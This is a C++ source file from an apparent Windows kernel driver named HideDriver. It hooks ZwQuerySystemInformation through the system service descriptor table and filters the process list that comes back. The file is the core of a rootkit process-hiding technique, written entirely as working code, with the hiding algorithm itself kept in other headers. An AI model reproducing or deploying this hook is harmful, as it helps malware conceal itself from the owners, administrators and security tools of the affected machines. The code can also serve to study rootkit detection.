#include "drvCommon.h"
#include "HookFactory.h"
#include "ProcessHook.h"
#include "StringUtils.h"
#include "ProcessHideAlgorithm.h"

extern "C"
{
typedef NTSTATUS (*NtQuerySystemInfoPtr)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );

NTSTATUS NewNtQuerySystemInfo(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
};

namespace HideDriver
{
const wchar_t* strZwQuerySystemInfo = L"ZwQuerySystemInformation";

/*Pointer to original NtQuerySystemInformation function*/
NtQuerySystemInfoPtr TrueNtQuerySystemInfo;

/*File checker decide hide file or not*/
HideAlgorithm::IProcessChecker* gProcessChecker;

/*NewNtQuerySystemInfo: hooked version of NtQuerySystemInformation function*/
NTSTATUS NewNtQuerySystemInfo(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
							  IN OUT PVOID SystemInformation,
							  IN ULONG SystemInformationLength,
							  OUT PULONG ReturnLength OPTIONAL);

//////////////////////////////////////////////////////////////////////////////////

ProcessHook::ProcessHook(HideAlgorithm::IProcessChecker* processChecker)
{
    gProcessChecker = processChecker;
}

void ProcessHook::Initialize(HookMng& hookMng)
{
    std::wstring functionName(strZwQuerySystemInfo);
    UNICODE_STRING functionNameUnc = utils::wstring2UnicodeStr(functionName); 

    hook_ = CreateSSTHook( &NewNtQuerySystemInfo ,&functionNameUnc);

    // Need to save original function address before apply hook
    TrueNtQuerySystemInfo = (NtQuerySystemInfoPtr)hook_.trueFuncPtr;

    hookMng.AddHook(hook_);
}

void ProcessHook::Cleanup(HookMng& hookMng)
{
    hookMng.DeleteHook(hook_);
}

//////////////////////////////////////////////////////////////////////////////////


NTSTATUS NewNtQuerySystemInfo(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
						      IN OUT PVOID SystemInformation,
							  IN ULONG SystemInformationLength,
							  OUT PULONG ReturnLength OPTIONAL)
{
	NTSTATUS status = TrueNtQuerySystemInfo(SystemInformationClass, SystemInformation,
											SystemInformationLength, ReturnLength);
    if( !NT_SUCCESS(status) )
        return status;

	if(SystemInformationClass != SystemProcessesAndThreadsInformation)
		return status;

	using namespace HideAlgorithm;

	NtQuerySysInfoParams params = {SystemInformationClass,SystemInformation,
								   SystemInformationLength,ReturnLength};

	return HideProcess(params,gProcessChecker);
}
}// namespace HideDriver